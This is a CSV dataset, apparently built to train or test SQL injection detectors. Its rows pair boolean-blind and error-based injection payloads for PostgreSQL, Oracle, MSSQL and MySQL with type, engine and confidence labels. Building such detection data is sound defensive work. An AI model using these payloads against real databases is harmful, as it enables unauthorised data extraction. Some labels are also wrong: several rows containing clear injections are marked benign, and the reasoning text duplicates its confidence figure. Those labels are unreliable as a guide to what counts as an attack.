id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
40178,"1\' or username = ""-9644 ) ) and ( ( 5616 = 5616"" or username = ""-5863"" and username = ""1%",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40179,"select * from users WHERE username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798 or username = ""-9501\' )",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),2
40180,"select * from users WHERE username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'rknd\' like \'rknd"" or username = ""-3499\' ) ) )",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40181,"select * from users WHERE username = ""1"" or username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40182,"SELECT * FROM users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" OR usErnamE = ""-7874 ) ) )",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40183,"select * from users WHERE username = ""-5585\' or username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40184,-8057\' ) ) as gpue where 4205 = 4205 || 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.65,Classified as error_based (confidence 0.65) (confidence 0.65),0
40185,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40186,"1\' ) ) ) and username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'stqx\' = \'stqx",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40187,"select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6353%\' ) )",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40188,"1"" and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-7199\' and username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'",boolean_blind,oracle,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40189,-1889%\' ) ) ) and ( ( ( \'%\' = \',boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40190,1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40191,"select * from users WHERE username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" and username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,mssql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40192,"select * from users WHERE username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'"" and username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40193,"select * from users WHERE username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",boolean_blind,oracle,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40194,"-6190\' ) where 2621 = 2621 or username = ""-1254"" and username = ""-2154%\' and \'%\' = \'",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40195,-1641\' ) ) and ( ( \'vgcb\' like \'vgcb,boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40196,"-8860 ) and username = ""-2756\' where 6156 = 6156 and username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 7732 = 7732",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40197,"select * from users WHERE username = ""-5585\' and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""1\' and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40198,-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp,boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40199,"-7430\' ) as xfah where 1596 = 1596 and username = ""-7199\' and \'qibr\' = \'qibr"" and username = ""-1641\' ) ) or username = ""1\' ) ) and ( ( \'guxv\' = \'guxv",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40200,"select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1"" or username = ""1 )",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40201,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40202,"select * from users WHERE username = ""1"" and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and ( 2576 = 2576"" and username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616",boolean_blind,oracle,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40203,"-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-1254"" or username = ""1 ) and ( ( 8254 = 8254",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40204,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-1254",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40205,"select * from users WHERE username = ""-3978 or username = ""-7199\' or username = ""-7962\' ) ) as pgqz where 6058 = 6058",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40206,"-6353%\' ) ) or username = ""-6190\' ) where 2621 = 2621 and username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40207,"-1889%\' ) ) ) or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40208,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40209,"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or username = ""-5585\' or username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40210,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' or username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40211,"1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40212,"1\' ) AND username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'",boolean_blind,oracle,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40213,"-2783%\' ) ) or username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40214,"-8163 ) ) as cvai where 2360 = 2360 and username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40215,"select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 ) ) )",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40216,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),2
40217,"-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) and username = ""-6190\' ) where 2621 = 2621 or username = ""-1254",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40218,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz"" and username = ""1\' )",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40219,"AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) AND ELT([INFERENCE],[RANDNUM])",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),0
40220,"OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) OR ELT([INFERENCE],[RANDNUM])",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),0
40221,"AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END) AND EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)",error_based,mysql,0.75,Error-based signal detected: 'extractvalue' for mysql,4
40222,"AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",error_based,oracle,0.75,Error-based signal detected: 'ctxsys' for oracle (confidence 0.75),4
40223,"OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",error_based,oracle,0.75,Error-based signal detected: 'ctxsys' for oracle (confidence 0.75),4
